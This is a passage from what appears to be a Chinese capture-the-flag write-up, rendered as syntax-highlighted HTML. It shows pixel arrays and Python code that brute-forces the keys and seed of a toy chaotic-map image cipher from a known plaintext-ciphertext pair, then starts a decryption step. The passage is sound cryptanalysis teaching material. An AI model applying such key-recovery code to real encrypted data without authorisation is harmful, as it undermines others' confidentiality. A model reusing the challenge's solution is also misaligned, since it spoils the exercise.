class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">key1key2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    a = testimage[i] ^ encrypt_testimage[i]</span><br><span class="line">    <span class="comment"># a 就是前16个key1和key2的组合</span></span><br><span class="line">    key1key2.append(encrypt_testimage[i] ^ a &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.999999</span></span><br><span class="line"></span><br><span class="line">list_r = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>]</span><br><span class="line">keys1 = [<span class="number">78</span>, <span class="number">177</span>]</span><br><span class="line">keys2 = [<span class="number">86</span>, <span class="number">169</span>]</span><br><span class="line"><span class="keyword">while</span> x0 &gt;= <span class="number">0.000001</span>:</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> list_r:</span><br><span class="line">        c = []</span><br><span class="line">        <span class="keyword">for</span> key1 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key2 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">        <span class="keyword">for</span> key2 <span class="keyword">in</span> keys1:</span><br><span class="line">            <span class="keyword">for</span> key1 <span class="keyword">in</span> keys2:</span><br><span class="line">                cipher = encrypt(testimage, key1, key2, x0, <span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> cipher == encrypt_testimage:</span><br><span class="line">                    <span class="built_in">print</span>(r, x0, key1, key2)</span><br><span class="line">    x0 = <span class="built_in">round</span>(x0-<span class="number">0.000001</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure>

<h3 id="三、解密"><a href="#三、解密" class="headerlink" title="三、解密"></a>三、解密</h3><p>爆出这些东西，应该就可以搞了，其实加密函数同时也是解密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span 